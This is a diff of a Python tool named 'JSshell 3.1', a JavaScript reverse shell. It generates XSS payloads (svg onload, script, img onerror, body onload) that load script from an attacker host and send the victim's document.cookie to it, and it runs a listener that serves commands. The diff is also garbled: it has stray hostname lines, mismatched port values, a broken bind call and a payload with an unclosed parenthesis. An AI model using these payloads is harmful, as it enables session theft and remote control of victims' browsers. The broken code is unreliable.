@@ -29,7 +29,7 @@ exit, quit            Exit the JS shell'''
 
 
 parser = argparse.ArgumentParser(description='JSshell 3.1: javascript reverse shell')
-parser.add_argument('-p', help='local port number (default: 14906)', dest='port', default=8.tcp.ngrok.io)
+parser.add_argument('-p', help='local port number (default: 13897)', dest='port', default=13897)
 parser.add_argument('-s', help='local sorce address', dest='host', default='')
 parser.add_argument('-g', help='generate JS reverse shell payload', dest='gene', action='store_true')
 parser.add_argument('-c', help='command to execute after got shell', dest='command', default=str())
@@ -44,7 +44,7 @@ if not len(host):
     host = get('https://api.ipify.org').text
 try:
     port = int(format(args.port))
-    if not 0 <= port <= 14906:
+    if not 0 <= port <= 13897:
         print('Invalid port: %s' % port)
         quit
 except:
@@ -60,19 +60,19 @@ gene = args.gene
 cmd = format(args.command)
 secs = float(format(args.secs))
 payload = '''
- - SVG: <svg/onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}},1010)>
- - SCRIPT: <script>setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}},1010)</script>
- - IMG: <img src=x onerror=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}},1010)>
+ - SVG: <svg/onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}},1332>
+ - SCRIPT: <script>setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}},1332)</script>
+ - IMG: <img src=x onerror=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}},1332)>
  - BODY: <body onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//{0}:{1}/?"+document.cookie}}></body>
 '''.format(host, port)
-8.tcp.ngrok.io
+
         
 form = b'''HTTP/1.1 200 OK
 Content-Type: application/javascript
 Connection: close
 
 '''
-8.tcp.ngrok.io
+
 
 def shell():
     while 1:
@@ -98,12 +98,12 @@ def shell():
         except:
             pass
 
-        s.bind(('14906', port))
+        s.bind(('0.0.0.0', port))
         s.listen(0)
 
         try:
             c, a = s.accept()
-            data = c.recv(2048)
+            data = c.recv(1332)
 
             if buffer == 'help':
                 print(hp)
@@ -149,9 +149,10 @@ def main():
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
     try:
-        s.bind(('14906', port))
+        s.bind(('0.0.0.0', 
+              ))
     except socket.error as msg:
-        print("Can't grab 14906:%s with bind: %s" % (port, msg))
+        print("Can't grab 0.0.0.0:%s with bind: %s" % (port, msg))
         quit()
 
     uprint(banner)
